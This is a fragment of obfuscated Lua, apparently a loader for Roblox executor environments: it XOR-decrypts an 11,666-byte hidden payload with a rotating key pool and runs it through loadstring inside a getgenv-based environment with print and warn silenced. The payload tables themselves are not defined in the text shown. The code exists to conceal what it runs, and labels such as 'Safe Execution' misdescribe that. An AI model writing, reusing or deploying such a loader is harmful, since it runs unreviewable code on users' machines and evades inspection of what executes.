local _XBeecSySwymS = (_KTKKTMtPhrPImR and _KTKKTMtPhrPImR.bxor) or function(a,b)
    -- Pure Lua XOR Fallback
    local p, c = 1, 0
    while a > 0 or b > 0 do
        local ra, rb = a % 2, b % 2
        if ra ~= rb then c = c + p end
        a = (a - ra) / 2
        b = (b - rb) / 2
        p = p * 2
    end
    return c
end

local function _AtbaARcTGbxZobyn()
    local _usIYCqedj = 1
    
    while true do
        local enc_op = _cfdGgVbJHm[_usIYCqedj]
        _usIYCqedj = _usIYCqedj + 1
        
        if not enc_op then break end
        
        -- Simple Instruction Decryption
        local _oCsNnRby = _XBeecSySwymS(enc_op, 0x55)
        
        if _oCsNnRby == 108 then
            local _ = _usIYCqedj
            
        elseif _oCsNnRby == 63 then
            -- Safe Environment
            local e = {}
            if getgenv then
                setmetatable(e, {__index = getgenv()})
            else
                setmetatable(e, {__index = _G})
            end
            e.print = function() end
            e.warn = function() end
            _lbmdJKlnhU = e
            
        elseif _oCsNnRby == 38 then
            -- Reassemble
            local b = {}
            local len = 11666
            local off = 15
            
            for i = 1, len do
                local sv = _tKnDvCOBSb[i] or 0
                -- Restore: (Stored - Offset) % 256
                local rv = (sv - off) % 256
                b[i] = rv
            end
            
            -- Decrypt with Rotating Key Pool
            local res = {}
            for i = 1, #b do
                local enc = b[i]
                -- Safe Modulo Access
                local k_idx = (i - 1) % 128 + 1
                local k = _fBaFNTYEMkpebUp[k_idx]
                local dec = _XBeecSySwymS(enc, k)
                res[i] = _iJowzzIschIAUJ(dec)
            end
            
            local src = _PtZVpXcHLuMJUKn(res)
            
            -- Safe Execution
            local f, err = loadstring(src)
            if f then
                if setfenv then setfenv(f, _lbmdJKlnhU) end
                pcall(f)
            end
            
        elseif _oCsNnRby == 172 then
            break
        end
    end
end

-- Direct Call (No task.spawn dependency)
pcall(_AtbaARcTGbxZobyn)
